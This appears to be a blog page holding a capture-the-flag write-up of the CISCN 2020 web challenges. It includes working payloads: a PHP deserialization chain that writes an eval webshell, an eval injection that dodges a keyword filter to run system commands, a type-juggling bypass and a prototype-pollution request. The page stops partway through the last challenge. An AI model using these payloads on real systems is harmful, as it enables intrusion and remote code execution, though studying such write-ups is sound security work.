@@ -1,0 +1,629 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>全国大学生信息安全竞赛Ciscn-Writeup - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="全国大学生信息安全竞赛Ciscn-Writeup">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-08-20 18:44" pubdate>
+        2020年8月20日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">全国大学生信息安全竞赛Ciscn-Writeup</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年9月6日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="0xfafau-2战队WRITEUP"><a href="#0xfafau-2战队WRITEUP" class="headerlink" title="0xfafau_2战队WRITEUP"></a>0xfafau_2战队WRITEUP</h1><h2 id="一-战队信息："><a href="#一-战队信息：" class="headerlink" title="一.战队信息："></a>一.战队信息：</h2><p>战队名称：0xfafu_2</p>
+<p>战队排名:   262</p>
+<h2 id="二-解题情况："><a href="#二-解题情况：" class="headerlink" title="二.解题情况："></a>二.解题情况：</h2><p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/22.png" srcset="/img/loading.gif"></p>
+<h2 id="1-web"><a href="#1-web" class="headerlink" title="1.web"></a>1.web</h2><h3 id="1-easyphp"><a href="#1-easyphp" class="headerlink" title="1.easyphp"></a>1.easyphp</h3><h4 id="1-考点：考的是php的一个bug"><a href="#1-考点：考的是php的一个bug" class="headerlink" title="1.考点：考的是php的一个bug"></a>1.考点：考的是php的一个bug</h4><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=78272">https://bugs.php.net/bug.php?id=78272</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//题目环境：php:7.4.8-apache</span><br>    <span class="hljs-variable">$pid</span> = pcntl_fork();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;could not fork&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>)&#123;<br>        <span class="hljs-variable">$r</span>=pcntl_wait(<span class="hljs-variable">$status</span>);<br>        <span class="hljs-keyword">if</span>(!pcntl_wifexited(<span class="hljs-variable">$status</span>))&#123;<br>            phpinfo();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="hljs-string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>            call_user_func_array(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>]);<br>        &#125;<br>        posix_kill(posix_getpid(), SIGUSR1);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>我们用游览器访问，会直接跳到第三个else，就是<code>highlight_file(__FILE__);</code>这一栏，但是把源码copy下来在用bash本地运行，可以发现会执行<code>phpinfo()</code>这个函数。</p>
+<p>在利用call_user_func_array()调用命令执行函数无果的情况下，猜测信息应该在phpinfo里了</p>
+<p>利用上面的phpbug以及配合<code>call_user_func该</code>回调函数得到：</p>
+<p>payload: <code>?a=call_user_func&amp;b=pcntl_wait</code></p>
+<p>（利用payload: <code>?a=call_user_func&amp;b=posix_kill</code>会让容器要求重新下放23333）</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/2.png" srcset="/img/loading.gif"></p>
+<h3 id="2-babyunserialize"><a href="#2-babyunserialize" class="headerlink" title="2.babyunserialize"></a>2.babyunserialize</h3><h4 id="1-考点：php反序列化写webshell"><a href="#1-考点：php反序列化写webshell" class="headerlink" title="1.考点：php反序列化写webshell"></a>1.考点：php反序列化写webshell</h4><p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/3.png" srcset="/img/loading.gif"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://www.zip得道源码./">www.zip得道源码。</a></p>
+<p>在网站入口看到反序列化函数，<code>$_GET[&#39;flag&#39;]</code>参数可控</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/4.png" srcset="/img/loading.gif"></p>
+<p>找个反序列化的入口文件，通过序列化，我们可以控制<code>$this-&gt;lazy</code>和<code>$this-&gt;write</code>参数。</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/5.png" srcset="/img/loading.gif"></p>
+<p>我们也可以控制<code>this-&gt;dir</code>和<code>this-&gt;format</code>的值，让我们可以执行到<code>$fw-&gt;write</code></p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/6.png" srcset="/img/loading.gif"></p>
+<p>最后利用base.php下的<code>write</code>方法，写入webshell.</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/7.png" srcset="/img/loading.gif"></p>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Jig</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">lazy</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$format</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$lazy</span>,<span class="hljs-variable">$data</span>,<span class="hljs-variable">$format</span>,<span class="hljs-variable">$dir</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;lazy = <span class="hljs-variable">$lazy</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;data = <span class="hljs-variable">$data</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-variable">$format</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;dir = <span class="hljs-variable">$dir</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    $j = new DB\Jig(true,array(&quot;reader.php&quot;=&gt;array(&#x27;&lt;?php @eval($_GET[reader]);?&gt;&#x27;)),0,1);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$j</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>生成payload，用flag参数get上去，可以执行任意代码了。</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/8.png" srcset="/img/loading.gif"></p>
+<p>找到flag。</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/9.png" srcset="/img/loading.gif"></p>
+<h3 id="3-easytrick"><a href="#3-easytrick" class="headerlink" title="3.easytrick"></a>3.easytrick</h3><h4 id="1-考点：反序列化-php弱类型比较-md5碰撞"><a href="#1-考点：反序列化-php弱类型比较-md5碰撞" class="headerlink" title="1.考点：反序列化+php弱类型比较/[md5碰撞]"></a>1.考点：反序列化+php弱类型比较/[md5碰撞]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;trick1;<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;trick1) &gt; <span class="hljs-number">5</span> || strlen(<span class="hljs-keyword">$this</span>-&gt;trick2) &gt; <span class="hljs-number">5</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你太长了&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;trick1 !== <span class="hljs-keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="hljs-keyword">$this</span>-&gt;trick1) === md5(<span class="hljs-keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;trick1 != <span class="hljs-keyword">$this</span>-&gt;trick2)&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;trick&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+<p>我们想拿到flag，需要经过以下步骤：</p>
+<p>1.通过反序列化漏洞控制后<code>$trick1</code>和<code>$trick2</code>参数。</p>
+<p>2.绕过这两个参数的长度限制。</p>
+<p>3.绕过<code>$this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2</code>判断。</p>
+<p>通过double(0)和string (0)会弱类型相等，而string(INF)和double(INF)不会相等，来绕过限制。</p>
+<p>poc: <strong>需要用php7版本，php5.6应该不行</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick1</span> = <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick2</span> = <span class="hljs-number">1</span>/<span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> trick();<br><span class="hljs-keyword">echo</span> (serialize(<span class="hljs-variable">$t</span>));<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/10.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/11.png" srcset="/img/loading.gif"></p>
+<h3 id="4-rceme"><a href="#4-rceme" class="headerlink" title="4.rceme"></a>4.rceme</h3><h4 id="1-考点：代码执行-绕过正则"><a href="#1-考点：代码执行-绕过正则" class="headerlink" title="1.考点：代码执行+绕过正则"></a>1.考点：代码执行+绕过正则</h4><p>仔细审查，在<code>parserIfLabel</code>方法里可以发现<code>eval</code>这个函数，可以利用来进行代码执行，进而执行任意命令。</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/12.png" srcset="/img/loading.gif"></p>
+<p>利用这个eval进行命令执行的，需要以下条件：</p>
+<p>1.需要进入<code>parserIfLabel</code>方法的第一个if条件语句内。这样我们必须得通过该正则。</p>
+<p>2.需要通过<code>danger_key</code>方法的审查。（这个可以用拼接绕过）</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/13.png" srcset="/img/loading.gif"></p>
+<p>3.拼接eval()语句，执行命令</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/12.png" srcset="/img/loading.gif"></p>
+<p>payload:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;&#123;if:12)(&#x27;s&#x27;.&#x27;ystem&#x27;)(&#x27;ls&#x27;);//&#125;&#123;end if&#125;&#125;&quot;</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;&#123;if:1)(&#x27;s&#x27;.&#x27;ystem&#x27;)(&#x27;cat /flag&#x27;);//&#125;&#123;end if&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/14.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/15.png" srcset="/img/loading.gif"></p>
+<h3 id="5-littlegame"><a href="#5-littlegame" class="headerlink" title="5.littlegame"></a>5.littlegame</h3><h4 id="1-考点：原型链污染"><a href="#1-考点：原型链污染" class="headerlink" title="1.考点：原型链污染"></a>1.考点：原型链污染</h4><p>下载源码后，全局搜索flag</p>
+<p>我们可以发现，要想拿到flag需要绕过<code>Admin[key]===password</code>这个条件判断，<code>key</code>和<code>password</code>是我们可控的</p>
+<p><img src="/2020/08/20/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BCiscn-Writeup/16.png" srcset="/img/loading.gif"></p>
+<p>但是<code>Admin[key]</code>我们不知道。</p>
+<p>因此我们可以利用该原型链污染，让<code>Admin[key]</code>等于<code>reader</code>，然后我们再传password=reader的话，这样就可以拿到flag了。</p>
+<blockquote>
+<p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined。</p>
+<p>原型链污染就是：在我们想要利用的代码之前的赋值语句如果可控的话，我们进行 ——<code>__proto__</code> 赋值，之后就可以利用代码了。</p>
+</blockquote>
+<p>poc:</p>
+<p>先发送一个这个包，让Admin[key]往上层查找时找到reader</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /Privilege HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: eci-<span class="hljs-number">2</span>ze<span class="hljs-number">8</span>fdkadazxoi<span class="hljs-number">5</span>dk<span class="hljs-number">9</span>z<span class="hljs-number">2</span>.cloudeci<span class="hljs-number">1</span>.ichunqiu.com:<span class="hljs-number">8888</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">79</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://eci-<span class="hljs-number">2</span>ze<span class="hljs-number">8</span>fdkadazxoi<span class="hljs-number">5</span>dk<span class="hljs-number">9</span>z<span class="hljs-number">2</span>.cloudeci<span class="hljs-number">1</span>.ichunqiu.com:<span class="hljs-number">8888</span>/Privilege<br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">1725</span>e<span class="hljs-number">2</span>c<span class="hljs-number">2</span>c<span class="hljs-number">00221</span>-<span class="hljs-number">06</span>fdee<span class="hljs-number">0</span>e<span class="hljs-number">1</span>b<span class="hljs-number">1</span>c<span class="hljs-number">67</span>-<span class="hljs-number">3</span>e<span class="hljs-number">6</span>d<span class="hljs-number">4644</span>-<span class="hljs-number">144000</span>-<span class="hljs-number">1725</span>e<span class="hljs-number">2</span>c<span class="hljs-number">2</span>c<span class="hljs-number">0172</span>; Hm_lvt_<span class="hljs-number">2</span>d<span class="hljs-number">0601</span>bd<span class="hljs-number">28</span>de<span class="hljs-number">7</span>d<span class="hljs-number">49818249</span>cf<span class="hljs-number">35</span>d<span class="hljs-number">95943</span>=<span class="hljs-number">1590717854</span>; __jsluid_h=<span class="hljs-number">64</span>c<span class="hljs-number">7</span>b<span class="hljs-number">39</span>c<span class="hljs-number">386</span>e<span class="hljs-number">455</span>edf<span class="hljs-number">1</span>b<span class="hljs-number">9503</span>d<span class="hljs-number">32</span>e<span class="hljs-number">41</span>f<span class="hljs-number">0</span>; session=s%<span class="hljs-number">3</span>ACB<span class="hljs-number">6</span>F<span class="hljs-number">1</span>T<span class="hljs-number">639</span>H<span class="hljs-number">62</span>i_<span class="hljs-number">6</span>NxIIpj<span class="hljs-number">2</span>oIFTc<span class="hljs-number">8</span>H_dw.yU<span class="hljs-number">3</span>EnqU%<span class="hljs-number">2</span>B<span class="hljs-number">4</span>i<span class="hljs-number">2</span>MOGJbBJCg<span class="hljs-number">3</span>i<span class="hljs-number">4</span>i<span class="hljs-number">703</span>zMtPvsXJbECJZRv<span class="hljs-number">8</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Origin</span>: http://eci-<span class="hljs-number">2</span>ze<span class="hljs-number">8</span>fdkadazxoi<span class="hljs-number">5</span>dk<span class="hljs-number">9</span>z<span class="hljs-number">2</span>.cloudeci<span class="hljs-number">1</span>.ichunqiu.com:<span class="hljs-number">8888</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">57</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><br><span class="hljs-attribute">NewAttributeKey</span>=__proto__.reader&amp;NewAttributeValue=reader<br></code></pre></td></tr></table></figure>
+<p>再发送一个这个包，拿下flag</p>
